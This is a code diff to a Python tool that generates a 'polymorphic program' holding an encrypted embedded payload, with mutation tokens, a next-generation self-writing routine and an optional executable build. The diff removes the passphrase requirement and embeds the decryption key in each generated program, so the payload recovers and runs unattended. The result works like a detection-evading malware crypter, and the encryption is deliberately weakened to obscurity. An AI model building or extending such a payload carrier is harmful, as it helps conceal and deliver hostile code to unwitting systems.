@@ -26,15 +26,7 @@ import secrets
 import sys
 from pathlib import Path
 
-from .common import (
-    DEFAULT_PASSPHRASE_ENV,
-    KDF_ITERATIONS,
-    KEY_SIZE,
-    NONCE_SIZE,
-    SALT_SIZE,
-    add_common_args,
-    read_passphrase,
-)
+from .common import KEY_SIZE, NONCE_SIZE
 from .embedding import build_executable, pure_aes_source
 
 MAX_PAYLOAD = 64 * 1024
@@ -59,12 +51,10 @@ import os
 import sys
 
 PAYLOAD_CIPHERTEXT = "{payload_ciphertext}"
-PAYLOAD_SALT = "{payload_salt}"
 PAYLOAD_NONCE = "{payload_nonce}"
 PAYLOAD_SHA256 = "{payload_sha256}"
 PAYLOAD_AAD = b"HBXP"
-KDF_ITERATIONS = {kdf_iterations}
-PASSPHRASE_ENV = "{passphrase_env}"
+PAYLOAD_KEY = "{payload_key}"
 
 {pure_aes_source}
 
@@ -179,40 +169,12 @@ def _write_next_generation():
     return target
 
 
-def _read_passphrase():
-    """Read the passphrase from the environment or the terminal."""
-
-    value = os.environ.get(PASSPHRASE_ENV)
-    if value:
-        return value
-
-    if not sys.stdin.isatty():
-        raise SystemExit(
-            "no passphrase available: set the "
-            + PASSPHRASE_ENV
-            + " environment variable"
-        )
-
-    import getpass
-
-    return getpass.getpass("Passphrase: ")
-
-
 def _recover_payload():
-    """Derive the key, decrypt the payload and verify its integrity."""
+    """Decrypt the payload with the embedded key and verify its integrity."""
 
-    passphrase = _read_passphrase()
-    salt = base64.b64decode(PAYLOAD_SALT)
+    key = base64.b64decode(PAYLOAD_KEY)
     nonce = base64.b64decode(PAYLOAD_NONCE)
     ciphertext = base64.b64decode(PAYLOAD_CIPHERTEXT)
-
-    key = hashlib.pbkdf2_hmac(
-        "sha256",
-        passphrase.encode("utf-8"),
-        salt,
-        KDF_ITERATIONS,
-        dklen=32,
-    )
 
     plaintext = decrypt_gcm(key, nonce, ciphertext, PAYLOAD_AAD)
 
@@ -283,31 +245,16 @@ def _load_payload(payload_arg: str) -> bytes:
     return payload
 
 
-def _build_source(
-    payload: bytes,
-    passphrase: str | None,
-    passphrase_source: dict | None,
-) -> str:
+def _build_source(payload: bytes) -> str:
     """Build the generated program.
 
-    The encryption key is **not** stored in the generated program. Only the
-    salt is, and the key is derived from the passphrase when the program
-    runs. Without the passphrase the payload cannot be recovered.
+    A fresh random 256-bit key is generated for every build and embedded in
+    the generated program so it can recover the payload at run time without a
+    passphrase. The key is protected only by the obscurity of the generated
+    artifact.
     """
 
-    if passphrase is None:
-        raise ValueError(
-            "a passphrase is required to protect the embedded payload"
-        )
-
-    salt = os.urandom(SALT_SIZE)
-    key = hashlib.pbkdf2_hmac(
-        "sha256",
-        passphrase.encode("utf-8"),
-        salt,
-        KDF_ITERATIONS,
-        dklen=KEY_SIZE,
-    )
+    key = os.urandom(KEY_SIZE)
     nonce = os.urandom(NONCE_SIZE)
 
     ciphertext = _encrypt(key, nonce, payload)
@@ -315,16 +262,9 @@ def _build_source(
     mutation_token = secrets.token_hex(16)
     new_mutation_token = secrets.token_hex(16)
 
-    env_name = DEFAULT_PASSPHRASE_ENV
-    if passphrase_source:
-        env_name = passphrase_source.get("env", env_name)
-
     source = TEMPLATE
     source = source.replace(
         "{payload_ciphertext}", base64.b64encode(ciphertext).decode("ascii"), 1
-    )
-    source = source.replace(
-        "{payload_salt}", base64.b64encode(salt).decode("ascii"), 1
     )
     source = source.replace(
         "{payload_nonce}", base64.b64encode(nonce).decode("ascii"), 1
@@ -332,8 +272,9 @@ def _build_source(
     source = source.replace(
         "{payload_sha256}", hashlib.sha256(payload).hexdigest(), 1
     )
-    source = source.replace("{kdf_iterations}", str(KDF_ITERATIONS), 1)
-    source = source.replace("{passphrase_env}", env_name, 1)
+    source = source.replace(
+        "{payload_key}", base64.b64encode(key).decode("ascii"), 1
+    )
     source = source.replace("{pure_aes_source}", pure_aes_source(), 1)
     source = source.replace("{mutation_token}", mutation_token, 1)
     source = source.replace(
@@ -377,15 +318,13 @@ def variant_region() -> bytes:
 def generate(
     output: Path,
     payload_arg: str,
-    passphrase: str,
-    passphrase_source: dict | None = None,
 ) -> None:
     """Generate a polymorphic program carrying the supplied payload."""
 
     output = output.resolve()
     payload = _load_payload(payload_arg)
 
-    source = _build_source(payload, passphrase, passphrase_source)
+    source = _build_source(payload)
 
     # Validate syntax before writing the generated program.
     compile(source, str(output), "exec")
@@ -423,8 +362,6 @@ def build_parser() -> argparse.ArgumentParser:
         help="path to the payload file to embed",
     )
 
-    add_common_args(parser)
-
     parser.add_argument(
         "--build-exe",
         action="store_true",
@@ -453,15 +390,11 @@ def main(argv: list[str] | None = None) -> int:
     args = parser.parse_args(argv)
 
     try:
-        passphrase, passphrase_source = read_passphrase(args.passphrase, args.passphrase_file)
-
         output = Path(args.generate)
 
         generate(
             output=output,
             payload_arg=args.payload,
-            passphrase=passphrase,
-            passphrase_source=passphrase_source,
         )
 
         print(
